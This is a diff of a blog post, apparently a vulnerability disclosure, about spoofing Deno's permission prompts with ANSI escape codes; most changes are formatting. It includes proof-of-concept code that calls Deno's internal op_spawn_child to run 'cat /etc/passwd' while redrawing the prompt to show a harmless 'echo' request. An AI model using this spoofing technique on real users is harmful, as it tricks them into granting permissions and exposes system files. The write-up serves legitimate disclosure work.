@@ -16,6 +16,7 @@ However, the project for me served as a good start on my first few CVEs.
 Deno, by default, is secure. Deno doesn't make guarantees on runtime resources (CPU, RAM), but it does make guarantees on external access or permenant storage.
 
 For example, if a malicious script you ran (maybe `deno run https://example.com/malicious-script.ts`) tried to access the file system, it would be denied. This is because Deno's default permissions don't allow for:
+
 - network access
 - file system access
 - environment access
@@ -23,7 +24,7 @@ For example, if a malicious script you ran (maybe `deno run https://example.com/
 - ffi access
 - and even fingerprinting (system apis and disables high resolution timers)
 
-However, sometimes you *want* a script to have these permissions, so deno treats you with a prompt. For example, running `deno run https://example.com/grab-a-cat-pic.ts`, which grabs pictures of cats from an `example.com` API, would prompt you with:
+However, sometimes you _want_ a script to have these permissions, so deno treats you with a prompt. For example, running `deno run https://example.com/grab-a-cat-pic.ts`, which grabs pictures of cats from an `example.com` API, would prompt you with:
 
 ```
 ┌ ⚠️  Deno requests net access to "example.com".
@@ -43,15 +44,15 @@ and they're a great way to do things like offload CPU intensive tasks to a separ
 At the time, I was trying to fetch some data from my main file asynchronously, and wanted to see how well it worked with web workers.
 
 ```ts title=worker.ts
-console.log("hello from worker");
+console.log('hello from worker');
 ```
 
 ```ts title=main.ts
-const worker = new Worker(new URL("worker.ts", import.meta.url).href, {
-  type: "module",
+const worker = new Worker(new URL('worker.ts', import.meta.url).href, {
+	type: 'module'
 });
 
-const request = await fetch("https://example.com/api/cat-pics");
+const request = await fetch('https://example.com/api/cat-pics');
 ```
 
 ```sh
@@ -87,11 +88,11 @@ console.log(`
 ```
 
 ```ts title=main.ts
-const worker = new Worker(new URL("worker.ts", import.meta.url).href, {
-  type: "module",
+const worker = new Worker(new URL('worker.ts', import.meta.url).href, {
+	type: 'module'
 });
 
-const request = await fetch("https://example.com/api/malicious-fetch-fingerprint");
+const request = await fetch('https://example.com/api/malicious-fetch-fingerprint');
 ```
 
 ```sh
@@ -124,25 +125,28 @@ For ease of developer convenience, the Deno maintainers made this configurable, 
 This was hidden in `op` functionality, specifically in `op_spawn_child` and `op_kill`, where `op_spawn_child` works on `--unstable` and `op_kill` is configured to give access to all run permissions.
 
 ```ts
-const boldANSI = "\u001b[1m" // bold
-const unboldANSI = "\u001b[22m" // unbold
+const boldANSI = '\u001b[1m'; // bold
+const unboldANSI = '\u001b[22m'; // unbold
 
 const prompt = `┌ ⚠️  ${boldANSI}Deno requests run access to "echo"${unboldANSI}
-├ Requested by \`Deno.Command().output()`
+├ Requested by \`Deno.Command().output()`;
 
-const moveANSIUp = "\u001b[1A" // moves to the start of the line
-const clearANSI = "\u001b[2K" // clears the line
-const moveANSIStart = "\u001b[1000D" // moves to the start of the line
+const moveANSIUp = '\u001b[1A'; // moves to the start of the line
+const clearANSI = '\u001b[2K'; // clears the line
+const moveANSIStart = '\u001b[1000D'; // moves to the start of the line
 
-Deno[Deno.internal].core.ops.op_spawn_child({
-    cmd: "cat",
-    args: ["/etc/passwd"],
-    clearEnv: false,
-    env: [],
-    stdin: "null",
-    stdout: "inherit",
-    stderr: "piped"
-}, moveANSIUp + clearANSI + moveANSIStart + prompt)
+Deno[Deno.internal].core.ops.op_spawn_child(
+	{
+		cmd: 'cat',
+		args: ['/etc/passwd'],
+		clearEnv: false,
+		env: [],
+		stdin: 'null',
+		stdout: 'inherit',
+		stderr: 'piped'
+	},
+	moveANSIUp + clearANSI + moveANSIStart + prompt
+);
 ```
 
 Once again, this allowed me to spoof the prompt, providing another way to get a user to accidentally grant permissions to a malicious script.
